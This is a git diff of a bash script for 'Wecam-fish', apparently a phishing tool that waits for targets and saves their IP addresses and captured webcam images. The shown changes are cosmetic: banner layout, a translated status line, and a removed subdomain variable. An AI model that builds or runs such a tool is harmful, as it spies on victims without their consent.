@@ -7,16 +7,16 @@ mv captured_files/new/*.png captured_files/old/ > dev\null 2>&1 || true
 trap 'printf "\n";stop' 2
 
 banner() {
-    printf "        ()"
-    printf "        )("
-    printf "     o======o"
-    printf "        ||    Wecam-fish"
-    printf "        ||"
-    printf "        ||"
-    printf "   ,c88888888b"
-    printf "  ,88888888888b"
-    printf "  88888888888Y"
-    printf ",,;,,;;\"Y888888Y\",,,,,,,;;,;"
+    printf "                ()\n"
+    printf "                )(\n"
+    printf "            o======o\n"
+    printf "                ||    \e[1;92mWecam-fish\e[0m\n"
+    printf "                ||\n"
+    printf "                ||\n"
+    printf "        ,c88888888b\n"
+    printf "        ,88888888888b\n"
+    printf "        88888888888Y\n"
+    printf "        ,,;,,;;\"Y888888Y\",,,,,,,;;,;\n"
     printf "\n"
 }
 
@@ -50,7 +50,7 @@ catch_ip() {
 checkfound() {
 
     printf "\n"
-    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Çıxmaq üçün Ctrl + C düyməsini basın...\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Hədəfləri gözləyir,\e[0m\e[1;77m Çıxmaq üçün Ctrl + C düyməsini basın...\e[0m\n"
     
     while [ true ]; do
         if [[ -e "ip.txt" ]]; then
@@ -122,8 +122,6 @@ payload() {
 }
 
 start() {
-    default_subdomain="wecam-fish-$RANDOM"
-
     server
     payload
     checkfound
